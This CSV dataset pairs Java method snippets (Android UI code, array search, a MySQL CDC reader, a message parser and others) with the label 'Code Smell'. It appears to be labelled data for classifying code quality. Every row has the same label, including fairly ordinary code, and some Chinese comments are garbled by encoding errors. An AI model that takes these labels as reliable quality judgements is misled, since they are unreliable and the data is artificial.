text,label,text_label
"/** 
 * 瀵绘壘鏃嬭浆鏁扮粍鐩爣鍊�
 * @param nums
 * @param target
 * @return
 */
public int search(int[] nums,int target){
  int n=nums.length;
  if (n == 0) {
    return -1;
  }
  if (n == 1) {
    return nums[0] == target ? 0 : -1;
  }
  int l=0, r=n - 1;
  while (l <= r) {
    int mid=(l + r) / 2;
    if (nums[mid] == target) {
      return mid;
    }
    if (nums[0] <= nums[mid]) {
      if (nums[0] <= target && target < nums[mid]) {
        r=mid - 1;
      }
 else {
        l=mid + 1;
      }
    }
 else {
      if (nums[mid] < target && target <= nums[n - 1]) {
        l=mid + 1;
      }
 else {
        r=mid - 1;
      }
    }
  }
  return -1;
}",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  if (counterView != null) {
    counterOffset.set((counterView.counterDrawable.getWidth() * 0.85f + AndroidUtilities.dp(3)) / 2f);
    counterOffset2.set(getMeasuredWidth() / 2f + (overlayTextView.getDrawable().getWidth()) / 2f + AndroidUtilities.dp(3));
    overlayTextView.setTranslationX(-counterOffset.get());
    counterView.setTranslationX(counterOffset2.get() - counterOffset.get());
  }
 else {
    if (overlayTextView != null) {
      overlayTextView.setTranslationX(0);
    }
  }
  AndroidUtilities.rectTmp.set(0,0,getMeasuredWidth(),getMeasuredHeight());
  if (overlayProgress != 1f || !drawOverlayColor) {
    if (inc) {
      progress+=16f / 1000f;
      if (progress > 3) {
        inc=false;
      }
    }
 else {
      progress-=16f / 1000f;
      if (progress < 1) {
        inc=true;
      }
    }
    PremiumGradient.getInstance().updateMainGradientMatrix(0,0,getMeasuredWidth(),getMeasuredHeight(),-getMeasuredWidth() * 0.1f * progress,0);
    canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,PremiumGradient.getInstance().getMainGradientPaint());
    invalidate();
  }
  if (!BuildVars.IS_BILLING_UNAVAILABLE && !isFlickerDisabled) {
    flickerDrawable.setParentWidth(getMeasuredWidth());
    flickerDrawable.draw(canvas,AndroidUtilities.rectTmp,radius,null);
  }
  if (overlayProgress != 0 && drawOverlayColor) {
    paintOverlayPaint.setAlpha((int)(255 * overlayProgress));
    if (overlayProgress != 1f) {
      path.rewind();
      path.addCircle(getMeasuredWidth() / 2f,getMeasuredHeight() / 2f,Math.max(getMeasuredWidth(),getMeasuredHeight()) * 1.4f * overlayProgress,Path.Direction.CW);
      canvas.save();
      canvas.clipPath(path);
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
      canvas.restore();
    }
 else {
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
    }
  }
  super.dispatchDraw(canvas);
}",1,Code Smell
"/** 
 * Returns a string reporting the value of each declared field, via reflection. Static and transient fields are automatically skipped. Produces output like ""SimpleClassName[integer=1234,string=""hello"",character='c',intArray=[1,2,3]]"".
 */
public static String toString(Object o){
  Class<?> c=o.getClass();
  StringBuilder sb=new StringBuilder();
  sb.append(c.getSimpleName()).append('[');
  int i=0;
  for (  Field f : c.getDeclaredFields()) {
    if ((f.getModifiers() & (Modifier.STATIC | Modifier.TRANSIENT)) != 0) {
      continue;
    }
    f.setAccessible(true);
    try {
      Object value=f.get(o);
      if (i++ > 0) {
        sb.append(',');
      }
      sb.append(f.getName());
      sb.append('=');
      if (value.getClass().isArray()) {
        if (value.getClass() == boolean[].class) {
          sb.append(Arrays.toString((boolean[])value));
        }
 else         if (value.getClass() == byte[].class) {
          sb.append(Arrays.toString((byte[])value));
        }
 else         if (value.getClass() == char[].class) {
          sb.append(Arrays.toString((char[])value));
        }
 else         if (value.getClass() == double[].class) {
          sb.append(Arrays.toString((double[])value));
        }
 else         if (value.getClass() == float[].class) {
          sb.append(Arrays.toString((float[])value));
        }
 else         if (value.getClass() == int[].class) {
          sb.append(Arrays.toString((int[])value));
        }
 else         if (value.getClass() == long[].class) {
          sb.append(Arrays.toString((long[])value));
        }
 else         if (value.getClass() == short[].class) {
          sb.append(Arrays.toString((short[])value));
        }
 else {
          sb.append(Arrays.toString((Object[])value));
        }
      }
 else       if (value.getClass() == Character.class) {
        sb.append('\'').append(value).append('\'');
      }
 else       if (value.getClass() == String.class) {
        sb.append('""').append(value).append('""');
      }
 else {
        sb.append(value);
      }
    }
 catch (    IllegalAccessException unexpected) {
      throw new AssertionError(unexpected);
    }
  }
  sb.append(""]"");
  return sb.toString();
}",1,Code Smell
"private MySqlRecords pollSplitRecords() throws InterruptedException {
  Iterator<SourceRecords> dataIt;
  if (currentReader == null) {
    if (binlogSplits.size() > 0) {
      MySqlSplit nextSplit=binlogSplits.poll();
      currentSplitId=nextSplit.splitId();
      currentReader=getBinlogSplitReader();
      currentReader.submitSplit(nextSplit);
    }
 else     if (snapshotSplits.size() > 0) {
      MySqlSplit nextSplit=snapshotSplits.poll();
      currentSplitId=nextSplit.splitId();
      currentReader=getSnapshotSplitReader();
      currentReader.submitSplit(nextSplit);
    }
 else {
      LOG.info(""No available split to read."");
    }
    dataIt=currentReader.pollSplitRecords();
    return dataIt == null ? finishedSplit() : forRecords(dataIt);
  }
 else   if (currentReader instanceof SnapshotSplitReader) {
    dataIt=currentReader.pollSplitRecords();
    if (dataIt != null) {
      MySqlRecords records;
      if (context.isHasAssignedBinlogSplit()) {
        records=forNewAddedTableFinishedSplit(currentSplitId,dataIt);
        closeSnapshotReader();
        closeBinlogReader();
      }
 else {
        records=forRecords(dataIt);
        MySqlSplit nextSplit=snapshotSplits.poll();
        if (nextSplit != null) {
          currentSplitId=nextSplit.splitId();
          currentReader.submitSplit(nextSplit);
        }
 else {
          closeSnapshotReader();
        }
      }
      return records;
    }
 else {
      return finishedSplit();
    }
  }
 else   if (currentReader instanceof BinlogSplitReader) {
    dataIt=currentReader.pollSplitRecords();
    if (dataIt != null) {
      MySqlSplit nextSplit=snapshotSplits.poll();
      if (nextSplit != null) {
        closeBinlogReader();
        LOG.info(""It's turn to switch next fetch reader to snapshot split reader"");
        currentSplitId=nextSplit.splitId();
        currentReader=getSnapshotSplitReader();
        currentReader.submitSplit(nextSplit);
      }
      return MySqlRecords.forBinlogRecords(BINLOG_SPLIT_ID,dataIt);
    }
 else {
      closeBinlogReader();
      return finishedSplit();
    }
  }
 else {
    throw new IllegalStateException(""Unsupported reader type."");
  }
}",1,Code Smell
"String getFileName(int index);
private String getFileName(int index){
  if (index < 0) {
    return null;
  }
  if (!secureDocuments.isEmpty()) {
    if (index >= secureDocuments.size()) {
      return null;
    }
    SecureDocument location=secureDocuments.get(index);
    return location.secureFile.dc_id + ""_"" + location.secureFile.id+ "".jpg"";
  }
 else   if (!imagesArrLocations.isEmpty() || !imagesArr.isEmpty()) {
    if (!imagesArrLocations.isEmpty()) {
      if (index >= imagesArrLocations.size()) {
        return null;
      }
      ImageLocation location=imagesArrLocations.get(index);
      ImageLocation videoLocation=imagesArrLocationsVideo.get(index);
      if (location == null) {
        return null;
      }
      if (videoLocation != null && videoLocation != location) {
        return videoLocation.location.volume_id + ""_"" + videoLocation.location.local_id+ "".mp4"";
      }
 else {
        return location.location.volume_id + ""_"" + location.location.local_id+ "".jpg"";
      }
    }
 else {
      if (index >= imagesArr.size()) {
        return null;
      }
      return FileLoader.getMessageFileName(imagesArr.get(index).messageOwner);
    }
  }
 else   if (!imagesArrLocals.isEmpty()) {
    if (index >= imagesArrLocals.size()) {
      return null;
    }
    Object object=imagesArrLocals.get(index);
    if (object instanceof MediaController.SearchImage) {
      MediaController.SearchImage searchImage=((MediaController.SearchImage)object);
      return searchImage.getAttachName();
    }
 else     if (object instanceof TLRPC.BotInlineResult) {
      TLRPC.BotInlineResult botInlineResult=(TLRPC.BotInlineResult)object;
      if (botInlineResult.document != null) {
        return FileLoader.getAttachFileName(botInlineResult.document);
      }
 else       if (botInlineResult.photo != null) {
        TLRPC.PhotoSize sizeFull=FileLoader.getClosestPhotoSizeWithSize(botInlineResult.photo.sizes,AndroidUtilities.getPhotoSize());
        return FileLoader.getAttachFileName(sizeFull);
      }
 else       if (botInlineResult.content instanceof TLRPC.TL_webDocument) {
        return Utilities.MD5(botInlineResult.content.url) + ""."" + ImageLoader.getHttpUrlExtension(botInlineResult.content.url,FileLoader.getMimeTypePart(botInlineResult.content.mime_type));
      }
    }
  }
 else   if (pageBlocksAdapter != null) {
    return pageBlocksAdapter.getFileName(index);
  }
  return null;
}",1,Code Smell
"private void fill(Brush brush,boolean registerUndo,Runnable onDone){
  if (!canFill || lastLocation == null) {
    return;
  }
  if (brush == null) {
    brush=renderView.getCurrentBrush();
  }
  if (brush instanceof Brush.Elliptical || brush instanceof Brush.Neon) {
    brush=new Brush.Radial();
  }
  canFill=false;
  renderView.getPainting().clearStroke();
  pointsCount=0;
  realPointsCount=0;
  lastAngleSet=false;
  beganDrawing=false;
  if (registerUndo) {
    renderView.onBeganDrawing();
  }
  Size size=renderView.getPainting().getSize();
  float R=Math.max(Math.max(distance((float)lastLocation.x,(float)lastLocation.y,0,0),distance((float)lastLocation.x,(float)lastLocation.y,size.width,0)),Math.max(distance((float)lastLocation.x,(float)lastLocation.y,0,size.height),distance((float)lastLocation.x,(float)lastLocation.y,size.width,size.height))) / 0.84f;
  if (arrowAnimator != null) {
    arrowAnimator.cancel();
    arrowAnimator=null;
  }
  if (fillAnimator != null) {
    fillAnimator.cancel();
    fillAnimator=null;
  }
  final Point point=new Point(lastLocation.x,lastLocation.y,1);
  final Brush finalBrush=brush;
  fillAnimator=ValueAnimator.ofFloat(0,1);
  fillAnimator.addUpdateListener(anm -> {
    float t=(float)anm.getAnimatedValue();
    Path path=new Path(new Point[]{point});
    int color=finalBrush.isEraser() ? 0xffffffff : renderView.getCurrentColor();
    path.setup(color,t * R,finalBrush);
    renderView.getPainting().paintStroke(path,true,true,null);
  }
);
  fillAnimator.addListener(new AnimatorListenerAdapter(){
    @Override public void onAnimationEnd(    Animator animation){
      fillAnimator=null;
      Path path=new Path(new Point[]{point});
      path.setup(renderView.getCurrentColor(),1f * R,finalBrush);
      int color=finalBrush.isEraser() ? 0xffffffff : renderView.getCurrentColor();
      renderView.getPainting().commitPath(path,color,registerUndo,null);
      if (registerUndo) {
        renderView.onFinishedDrawing(true);
      }
      if (onDone != null) {
        onDone.run();
      }
    }
  }
);
  fillAnimator.setDuration(450);
  fillAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
  fillAnimator.start();
  if (registerUndo) {
    BotWebViewVibrationEffect.IMPACT_HEAVY.vibrate();
  }
}",1,Code Smell
"/** 
 * Intercept the target instance method.
 * @param obj          target class instance.
 * @param allArguments all method arguments
 * @param method       method description.
 * @param zuper        the origin call ref.
 * @return the return value of target instance method.
 * @throws Exception only throw exception because of zuper.call() or unexpected exception in sky-walking ( This is abug, if anything triggers this condition ).
 */
@RuntimeType public static Object intercept(@This Object obj,@AllArguments Object[] allArguments,@Morph OverrideCallable zuper,@Origin Method method) throws Throwable {
  EnhancedInstance targetObject=(EnhancedInstance)obj;
  prepare();
  MethodInterceptResult result=new MethodInterceptResult();
  try {
    if (INTERCEPTOR != null) {
      INTERCEPTOR.beforeMethod(targetObject,method,allArguments,method.getParameterTypes(),result);
    }
  }
 catch (  Throwable t) {
    if (LOGGER != null) {
      LOGGER.error(t,""class[{}] before method[{}] intercept failure"",obj.getClass(),method.getName());
    }
  }
  Object ret=null;
  try {
    if (!result.isContinue()) {
      ret=result._ret();
    }
 else {
      ret=zuper.call(allArguments);
    }
  }
 catch (  Throwable t) {
    try {
      if (INTERCEPTOR != null) {
        INTERCEPTOR.handleMethodException(targetObject,method,allArguments,method.getParameterTypes(),t);
      }
    }
 catch (    Throwable t2) {
      if (LOGGER != null) {
        LOGGER.error(t2,""class[{}] handle method[{}] exception failure"",obj.getClass(),method.getName());
      }
    }
    throw t;
  }
 finally {
    try {
      if (INTERCEPTOR != null) {
        ret=INTERCEPTOR.afterMethod(targetObject,method,allArguments,method.getParameterTypes(),ret);
      }
    }
 catch (    Throwable t) {
      if (LOGGER != null) {
        LOGGER.error(t,""class[{}] after method[{}] intercept failure"",obj.getClass(),method.getName());
      }
    }
  }
  return ret;
}",1,Code Smell
"@Override public String playerContent(String flag,String id,List<String> vipFlags){
  try {
    String[] infos=id.split(""\\+"");
    String shareTk=getShareTk(infos[0],"""");
    refreshTk();
    if (!accessTk.isEmpty()) {
      JSONObject json=new JSONObject();
      json.put(""share_id"",infos[0]);
      json.put(""category"",""live_transcoding"");
      json.put(""file_id"",infos[1]);
      json.put(""template_id"","""");
      HashMap<String,String> headers=new HashMap<>();
      headers.put(""x-share-token"",shareTk);
      headers.put(""authorization"",accessTk);
      OKCallBack.OKCallBackString callback=new OKCallBack.OKCallBackString(){
        @Override public void onFailure(        Call call,        Exception e){
        }
        @Override public void onResponse(        String response){
          String videoUrl="""";
          try {
            JSONArray playList=new JSONObject(response).getJSONObject(""video_preview_play_info"").getJSONArray(""live_transcoding_task_list"");
            String[] orders=new String[]{""FHD"",""HD"",""SD""};
            for (            String or : orders) {
              for (int i=0; i < playList.length(); i++) {
                JSONObject obj=playList.getJSONObject(i);
                if (obj.optString(""template_id"").equals(or)) {
                  videoUrl=obj.getString(""url"");
                  break;
                }
              }
              if (!videoUrl.isEmpty())               break;
            }
            if (videoUrl.isEmpty() && playList.length() > 0) {
              videoUrl=playList.getJSONObject(0).getString(""url"");
            }
          }
 catch (          JSONException e) {
          }
 finally {
            setResult(videoUrl);
          }
        }
      }
;
      OkHttpUtil.postJson(OkHttpUtil.defaultClient(),""https://api.aliyundrive.com/v2/file/get_share_link_video_preview_play_info"",json.toString(),headers,callback);
      JSONArray playList=new JSONObject(callback.getResult()).getJSONObject(""video_preview_play_info"").getJSONArray(""live_transcoding_task_list"");
      String videoUrl="""";
      String[] orders=new String[]{""FHD"",""HD"",""SD""};
      for (      String or : orders) {
        for (int i=0; i < playList.length(); i++) {
          JSONObject obj=playList.getJSONObject(i);
          if (obj.optString(""template_id"").equals(or)) {
            videoUrl=obj.getString(""url"");
            break;
          }
        }
        if (!videoUrl.isEmpty())         break;
      }
      if (videoUrl.isEmpty() && playList.length() > 0) {
        videoUrl=playList.getJSONObject(0).getString(""url"");
      }
      JSONObject headerObj=new JSONObject();
      headerObj.put(""user-agent"","" Dalvik/2.1.0 (Linux; U; Android 7.0; ZTE BA520 Build/MRA58K)"");
      headerObj.put(""referer"","" https://www.aliyundrive.com/"");
      JSONObject result=new JSONObject();
      result.put(""parse"",0);
      result.put(""playUrl"","""");
      result.put(""url"",videoUrl);
      result.put(""header"",headerObj.toString());
      return result.toString();
    }
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"public boolean isReflectField(int access,String className,String name){
  if (unknownClassNameReflectFieldNames.contains(name)) {
    return true;
  }
  if (getDeclaredFieldReflectFields.contains(getKey(className,name,DESC_ALL))) {
    return true;
  }
  if (getDeclaredFieldsReflectClassNames.contains(className)) {
    return true;
  }
  if (TypeUtil.isPublic(access)) {
    Set<String> classNames=new HashSet<>();
    for (    ReflectFieldModel reflectFieldModel : getFieldReflectModels) {
      if (name.equals(reflectFieldModel.memberName)) {
        classNames.clear();
        getAllSuperAndChildClass(reflectFieldModel.owner,classNames,true);
        if (classNames.contains(className)) {
          return true;
        }
      }
    }
    if (getFieldsReflectClassNames.contains(className)) {
      return true;
    }
    for (    String reflectClassName : getFieldsReflectClassNames) {
      classNames.clear();
      getAllSuperAndChildClass(reflectClassName,classNames,true);
      if (classNames.contains(className)) {
        return true;
      }
    }
  }
  return false;
}
",1,Code Smell
"public static HeadTail process(Node L,Node R,int N){
  if (L == null) {
    return null;
  }
  if (L == R) {
    return new HeadTail(L,R);
  }
  int randomIndex=(int)(Math.random() * N);
  Node randomNode=L;
  while (randomIndex-- != 0) {
    randomNode=randomNode.next;
  }
  if (randomNode == L || randomNode == R) {
    if (randomNode == L) {
      L=randomNode.next;
      L.last=null;
    }
 else {
      randomNode.last.next=null;
    }
  }
 else {
    randomNode.last.next=randomNode.next;
    randomNode.next.last=randomNode.last;
  }
  randomNode.last=null;
  randomNode.next=null;
  Info info=partition(L,randomNode);
  HeadTail lht=process(info.lh,info.lt,info.ls);
  HeadTail rht=process(info.rh,info.rt,info.rs);
  if (lht != null) {
    lht.t.next=info.eh;
    info.eh.last=lht.t;
  }
  if (rht != null) {
    info.et.next=rht.h;
    rht.h.last=info.et;
  }
  Node h=lht != null ? lht.h : info.eh;
  Node t=rht != null ? rht.t : info.et;
  return new HeadTail(h,t);
}",1,Code Smell
"private HashMap<String,byte[]> processCompleteMessage(ByteBuffer buffer) throws Exception {
  int len=buffer.getInt();
  int x=buffer.get();
  if (len > MAX_LEN) {
    throw new IOException(""invalid len"");
  }
  byte[] bs=new byte[len];
  buffer.get(bs);
  for (int i=0; i < bs.length; i++) {
    bs[i]=(byte)(bs[i] ^ x);
  }
  HashMap<String,byte[]> m=new HashMap<>();
  int i=0;
  while (i < bs.length - 1) {
    short kLen=bs[i];
    i+=1;
    if (i + kLen >= bs.length) {
      throw new Exception(""key len error"");
    }
    if (kLen < 0) {
      throw new Exception(""key len error"");
    }
    byte[] keyBytes=copyOfRange(bs,i,i + kLen);
    String key=new String(keyBytes);
    i+=kLen;
    if (i + 4 >= bs.length) {
      throw new Exception(""value len error"");
    }
    byte[] vLenBytes=copyOfRange(bs,i,i + 4);
    int vLen=bytesToU32(vLenBytes);
    i+=4;
    if (vLen < 0 || i + vLen > bs.length) {
      throw new Exception(""value error"");
    }
    byte[] value=copyOfRange(bs,i,i + vLen);
    i+=vLen;
    m.put(key,value);
  }
  return m;
}",1,Code Smell
"private void processServerBalance(TMaster tMaster,long balanceId,StringBuilder sBuffer){
  int curDoingTasks=this.curSvrBalanceParal.get();
  if (curDoingTasks > 0) {
    logger.info(sBuffer.append(""[Svr-Balance Status] "").append(balanceId).append("" the Server-Balance has "").append(curDoingTasks).append("" task(s) in progress!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return;
  }
  final boolean isStartBalance=startupBalance;
  List<String> groupsNeedToBalance=isStartBalance ? consumerHolder.getAllServerBalanceGroups() : getNeedToBalanceGroups(sBuffer);
  sBuffer.delete(0,sBuffer.length());
  int balanceTaskCnt=groupsNeedToBalance.size();
  if (balanceTaskCnt > 0) {
    int unitNum=(balanceTaskCnt + masterConfig.getRebalanceParallel() - 1) / masterConfig.getRebalanceParallel();
    int startIndex=0;
    int endIndex=0;
    final long startBalanceTime=System.currentTimeMillis();
    curSvrBalanceParal.set(masterConfig.getRebalanceParallel());
    for (int i=0; i < masterConfig.getRebalanceParallel(); i++) {
      startIndex=Math.min((i) * unitNum,balanceTaskCnt);
      endIndex=Math.min((i + 1) * unitNum,balanceTaskCnt);
      final List<String> subGroups=groupsNeedToBalance.subList(startIndex,endIndex);
      if (subGroups.isEmpty()) {
        if (curSvrBalanceParal.decrementAndGet() == 0) {
          MasterSrvStatsHolder.updSvrBalanceDurations(System.currentTimeMillis() - startBalanceTime);
        }
        continue;
      }
      this.svrExecutor.execute(new Runnable(){
        @Override public void run(){
          try {
            if (subGroups.isEmpty()) {
              return;
            }
            final StringBuilder strBuffer=new StringBuilder(512);
            try {
              tMaster.processResetbalance(balanceId,isStartBalance,subGroups,strBuffer);
            }
 catch (            Throwable e) {
              logger.warn(new StringBuilder(1024).append(""[Svr-Balance Status] Error during reset-reb,"").append(""the groups that may be affected are "").append(subGroups).append("",error is "").append(e).toString());
            }
            if (tMaster.isStopped()) {
              return;
            }
            try {
              tMaster.processRebalance(balanceId,isStartBalance,subGroups,strBuffer);
            }
 catch (            Throwable e) {
              logger.warn(new StringBuilder(1024).append(""[Svr-Balance Status] Error during normal-reb,"").append(""the groups that may be affected are "").append(subGroups).append("",error is "").append(e).toString());
            }
          }
 catch (          Throwable e) {
            logger.warn(""[Svr-Balance Status] Error during process"",e);
          }
 finally {
            if (curSvrBalanceParal.decrementAndGet() == 0) {
              MasterSrvStatsHolder.updSvrBalanceDurations(System.currentTimeMillis() - startBalanceTime);
            }
          }
        }
      }
);
    }
  }
  startupBalance=false;
}",1,Code Smell
"@Deprecated public static void init(Application application){
  if (sGlobalConfig != null) {
    init(application,sGlobalConfig);
  }
 else {
    init(application,new CodeLocatorConfig.Builder().build());
  }
}
@Deprecated public static void init(Application application,CodeLocatorConfig config){
  if (application == null) {
    throw new IllegalArgumentException(""Application can not be null!"");
  }
  if (config == null) {
    config=new CodeLocatorConfig.Builder().build();
  }
  sGlobalConfig=config;
  loadConfigListFromSp(application,sGlobalConfig);
  loadEnableFromSp(application,sGlobalConfig);
  if (sApplication != null) {
    if (sGlobalConfig.isDebug()) {
      Log.d(CodeLocator.TAG,""CodeLocator宸茬粡鍒濆鍖�, 鏃犻渶鍐嶅垵濮嬪寲"");
    }
    if (!sGlobalConfig.isEnable()) {
      Log.e(CodeLocator.TAG,""CodeLocator琚鐢�, 鏃犳硶浣跨敤鍏ㄩ儴鍔熻兘"");
      unRegisterReceiver();
    }
 else {
      if (disableLancet()) {
        Log.e(CodeLocator.TAG,""CodeLocator宸插惎鐢�, 浣嗘棤娉曚娇鐢ㄨ烦杞姛鑳�"");
      }
    }
    saveEnableForSp(application,sGlobalConfig);
    return;
  }
  sApplication=application;
  try {
    sCodeLocatorDir=new File(application.getExternalCacheDir(),CodeLocatorConstants.BASE_DIR_NAME);
    if (!sCodeLocatorDir.exists()) {
      sCodeLocatorDir.mkdirs();
    }
  }
 catch (  Throwable ignore) {
  }
  if (!sGlobalConfig.isLazyInit()) {
    registerLifecycleCallbacks();
    if (sGlobalConfig.isDebug()) {
      Log.d(CodeLocator.TAG,""CodeLocator鍒濆鍖栨垚鍔�"");
    }
  }
 else {
    sHandler.post(new Runnable(){
      @Override public void run(){
        mActiveActivityCount=getCurrentActivityCount();
        registerLifecycleCallbacks();
        if (mActiveActivityCount > 0) {
          checkAppForegroundChange();
        }
        if (sGlobalConfig.isDebug()) {
          Log.d(CodeLocator.TAG,""CodeLocator寤惰繜鍒濆鍖栨垚鍔�, 鍒濆Activity鏁� "" + mActiveActivityCount);
        }
      }
    }
);
  }
  if (sGlobalConfig.canFetchConfig()) {
    sHandler.postDelayed(() -> {
      try {
        final Class<?> aClass=Class.forName(""okhttp3.OkHttpClient"");
        CodeLocatorConfigFetcher.fetchCodeLocatorConfig(sApplication);
      }
 catch (      Throwable ignore) {
        Log.d(CodeLocator.TAG,""Error "" + ignore);
      }
    }
,3000L);
  }
}",1,Code Smell
"public static void hide(@NonNull FrameLayout containerLayout){
  hide(containerLayout,true);
}
public static void hide(@NonNull FrameLayout containerLayout,boolean animated){
  final Bulletin bulletin=find(containerLayout);
  if (bulletin != null) {
    bulletin.hide(animated && isTransitionsEnabled(),0);
  }
}
public void hide(){
  hide(isTransitionsEnabled(),0);
}
public void hide(long duration){
  hide(isTransitionsEnabled(),duration);
}
public void hide(boolean animated,long duration){
  if (layout == null) {
    return;
  }
  if (showing) {
    showing=false;
    if (visibleBulletin == this) {
      visibleBulletin=null;
    }
    int bottomOffset=currentBottomOffset;
    currentBottomOffset=0;
    if (ViewCompat.isLaidOut(layout)) {
      layout.removeCallbacks(hideRunnable);
      if (animated) {
        layout.transitionRunningExit=true;
        layout.delegate=currentDelegate;
        layout.invalidate();
        if (duration >= 0) {
          Layout.DefaultTransition transition=new Layout.DefaultTransition();
          transition.duration=duration;
          layoutTransition=transition;
        }
 else {
          ensureLayoutTransitionCreated();
        }
        layoutTransition.animateExit(layout,layout::onExitTransitionStart,() -> {
          if (currentDelegate != null && !layout.top) {
            currentDelegate.onBottomOffsetChange(0);
            currentDelegate.onHide(this);
          }
          layout.transitionRunningExit=false;
          layout.onExitTransitionEnd();
          layout.onHide();
          containerLayout.removeView(parentLayout);
          containerLayout.removeOnLayoutChangeListener(containerLayoutListener);
          layout.onDetach();
        }
,offset -> {
          if (currentDelegate != null && !layout.top) {
            currentDelegate.onBottomOffsetChange(layout.getHeight() - offset);
          }
        }
,bottomOffset);
        return;
      }
    }
    if (currentDelegate != null && !layout.top) {
      currentDelegate.onBottomOffsetChange(0);
      currentDelegate.onHide(this);
    }
    layout.onExitTransitionStart();
    layout.onExitTransitionEnd();
    layout.onHide();
    if (containerLayout != null) {
      AndroidUtilities.runOnUIThread(() -> {
        containerLayout.removeView(parentLayout);
        containerLayout.removeOnLayoutChangeListener(containerLayoutListener);
      }
);
    }
    layout.onDetach();
  }
}",1,Code Smell
